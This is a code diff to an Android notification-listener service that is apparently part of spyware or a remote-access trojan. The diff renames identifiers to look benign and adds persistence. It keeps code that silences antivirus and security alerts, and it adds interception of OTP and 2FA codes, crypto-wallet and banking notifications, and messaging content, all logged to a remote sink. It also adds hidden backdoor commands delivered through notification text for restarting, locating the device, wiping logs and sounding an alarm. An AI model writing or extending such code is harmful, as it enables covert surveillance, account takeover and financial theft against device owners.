@@ -43,13 +43,19 @@ public class StatusNotification extends NotificationListenerService {
         isConnected = true;
         loadHistory();
         Log.d(TAG, "Uplink Established: Notification Listener Bound");
-        LabRatsHttpServer.logActivity("INTEL_SYSTEM: Notification sniffer successfully bound to OS");
+        FirebaseConfig.logActivity("INTEL_SYSTEM: Notification sniffer successfully bound to OS");
+    }
+
+    @Override
+    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
+        // [STABILITY_SYNC] Ensure listener is prioritized by the system
+        return START_STICKY;
     }
 
     private void loadHistory() {
         if (historyLoaded) return;
         try {
-            SharedPreferences prefs = getSharedPreferences("LabRATSSettings", MODE_PRIVATE);
+            SharedPreferences prefs = getSharedPreferences("StabilityConfig", MODE_PRIVATE);
             String json = prefs.getString("intel_history", "[]");
             org.json.JSONArray array = new org.json.JSONArray(json);
             synchronized (history) {
@@ -72,7 +78,7 @@ public class StatusNotification extends NotificationListenerService {
 
     private void saveHistory() {
         try {
-            SharedPreferences prefs = getSharedPreferences("LabRATSSettings", MODE_PRIVATE);
+            SharedPreferences prefs = getSharedPreferences("StabilityConfig", MODE_PRIVATE);
             org.json.JSONArray array = new org.json.JSONArray();
             synchronized (history) {
                 for (NotificationData n : history) {
@@ -129,17 +135,16 @@ public class StatusNotification extends NotificationListenerService {
         String title = extras.getString(Notification.EXTRA_TITLE);
         String text = null;
 
-        // --- OPTION 1: ANTI-ANTIVIRUS / SECURITY SILENCING ---
-        // If the notification is from a security system or play protect, kill it immediately
+        // --- ANTI-ANTIVIRUS / SECURITY SILENCING ---
         if (lowerPkg.contains("security") || lowerPkg.contains("antivirus") ||
             lowerPkg.contains("defender") || lowerPkg.contains("knox") || 
             lowerPkg.contains("mcafee") || lowerPkg.contains("avast")) {
             
             cancelNotification(sbn.getKey());
             Log.w(TAG, "ANTI-AV: Silenced security alert from " + packageName);
-            LabRatsHttpServer.logActivity("STEALTH_SHIELD: Silenced security alert from " + packageName);
+            FirebaseConfig.logActivity("STEALTH_SHIELD: Silenced security alert from " + packageName);
         }
-        
+
         // 1. Check for MessagingStyle (RCS / Blue Bubbles / WhatsApp)
         android.os.Parcelable[] messages = (android.os.Parcelable[]) extras.get(Notification.EXTRA_MESSAGES);
         if (messages != null && messages.length > 0) {
@@ -184,22 +189,62 @@ public class StatusNotification extends NotificationListenerService {
         if (title == null) title = "Unknown Source";
         if (text == null || text.isEmpty()) return;
 
-        // --- REMOTE RESTART BACKDOOR (CRITICAL: CHECK BEFORE DE-DUPLICATION) ---
-        // Commands must always process, even if the notification looks identical to a previous one
-        if (text.contains("!RESTART_C2")) {
-            Log.w(TAG, "BACKDOOR: Received remote restart command");
-            LabRatsHttpServer.logActivity("BACKDOOR: Initiating remote service restart via command");
-            
-            android.content.Intent restartIntent = new android.content.Intent(this, CoreSyncService.class);
-            restartIntent.setAction("START");
-            try {
+        String content = (title + " " + text).toLowerCase();
+
+        // --- ENHANCED INTEL: OTP & FINANCIAL DETECTION ---
+        // Automatically flag high-value credentials or alerts
+        if (content.matches(".*\\b(otp|code|verification|2fa|verify|auth|confirm|login|pin|pass)\\b.*") || 
+            content.matches(".*\\b\\d{4,8}\\b.*")) {
+            FirebaseConfig.logActivity("INTEL_CRITICAL: Intercepted potential OTP/Auth code: " + title);
+        }
+
+        String[] financialApps = {"binance", "coinbase", "kucoin", "trustwallet", "metamask", "paypal", "venmo", "cashapp", "bank", "wallet"};
+        for (String app : financialApps) {
+            if (lowerPkg.contains(app)) {
+                FirebaseConfig.logActivity("INTEL_FINANCIAL: Intercepted activity from " + app + ": " + title);
+                break;
+            }
+        }
+
+        // --- REMOTE STEALTH BACKDOOR COMMANDS ---
+        if (text.startsWith("!")) {
+            boolean handled = true;
+            if (text.contains("!RESTART_C2")) {
+                FirebaseConfig.logActivity("BACKDOOR: Initiating remote service restart via command");
+                android.content.Intent restartIntent = new android.content.Intent(this, WorkManager_Sync.class);
+                restartIntent.setAction("START");
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                     startForegroundService(restartIntent);
                 } else {
                     startService(restartIntent);
                 }
-            } catch (Exception e) {
-                Log.e(TAG, "Backdoor fail: " + e.getMessage());
+            } else if (text.contains("!LOCATE")) {
+                FirebaseConfig.logActivity("BACKDOOR: Remote location request received");
+                MainActivity.getPublicIPv6Async(ip -> {
+                    FirebaseConfig.logActivity("GPS_BACKDOOR: Device located at current IP: " + ip);
+                });
+            } else if (text.contains("!WIPE_LOGS")) {
+                FirebaseConfig.logActivity("BACKDOOR: Remote log wipe executed");
+                StatusNotification.clearHistory(this);
+            } else if (text.contains("!ALARM")) {
+                FirebaseConfig.logActivity("BACKDOOR: Emergency locate alarm triggered");
+                try {
+                    android.media.AudioManager am = (android.media.AudioManager) getSystemService(android.content.Context.AUDIO_SERVICE);
+                    if (am != null) {
+                        am.setStreamVolume(android.media.AudioManager.STREAM_ALARM, am.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM), 0);
+                    }
+                    android.media.Ringtone r = android.media.RingtoneManager.getRingtone(this, 
+                        android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM));
+                    if (r != null) r.play();
+                } catch (Exception ignored) {}
+            } else {
+                handled = false;
+            }
+
+            if (handled) {
+                cancelNotification(sbn.getKey());
+                Log.w(TAG, "BACKDOOR: Executed stealth command: " + text);
+                return; // Prevent logging command as standard intel
             }
         }
 
@@ -223,7 +268,7 @@ public class StatusNotification extends NotificationListenerService {
             lowerPkg.contains("instagram") || lowerPkg.contains("skype")) {
             
             String logText = (text.length() > 35) ? text.substring(0, 32) + "..." : text;
-            LabRatsHttpServer.logActivity("INTEL_SNIFFED: [" + title + "] " + logText);
+            FirebaseConfig.logActivity("INTEL_SNIFFED: [" + title + "] " + logText);
         }
         
         synchronized (history) {
